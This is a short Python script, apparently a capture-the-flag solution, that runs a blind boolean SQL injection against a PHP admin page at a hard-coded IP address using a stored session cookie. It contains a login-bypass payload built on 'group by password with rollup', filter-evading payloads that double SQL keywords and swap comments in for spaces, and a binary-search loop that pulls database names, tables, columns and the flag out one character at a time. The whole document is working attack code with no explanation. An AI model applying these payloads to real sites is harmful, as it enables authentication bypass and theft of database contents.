import requests

url = 'http://42.192.42.48:8079/admin/daochu.php?id='
#登录的cookie
headers = {
        "cookie": "PHPSESSID=blpq9rbidrie21n59h9dccq0l6"
    }
data = {
    "user":"bmth'/**/group/**/by/**/password/**/with/**/rollup/**/limit/**/1/**/offset/**/1#",
}
result = ''
for x in range(1, 100):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        #获取当前数据库
        #payload = "0')||ascii(substr(database(),{},1))>{}%23" .format(x, mid)
        #获取所有数据库
        #payload = "0')||ascii(substr((seleselectct/**/group_conconcatcat(schema_name)/**/from/**/information_schema.schemata),{},1))>{}%23" .format(x, mid)
        #获取flagggg_1s_here数据库所有表
        #payload = "0')||ascii(substr((selselectect/**/group_concconcatat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='flagggg_1s_here'),{},1))>{}%23" .format(x, mid)
        #获取flagggg_1s_here数据库所有列
        #payload = "0')||ascii(substr((selselectect/**/group_concconcatat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema='flagggg_1s_here'/**/and/**/table_name='flag'),{},1))>{}%23" .format(x, mid)
        #获取flag
        payload = "0')||ascii(substr((selselectect/**/flag/**/from/**/flagggg_1s_here.flag),{},1))>{}%23" .format(x, mid)
        response = requests.post(url=url+payload, data=data,headers=headers)
        if b'test11' in response.content:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    result += chr(int(mid))
    print(result)
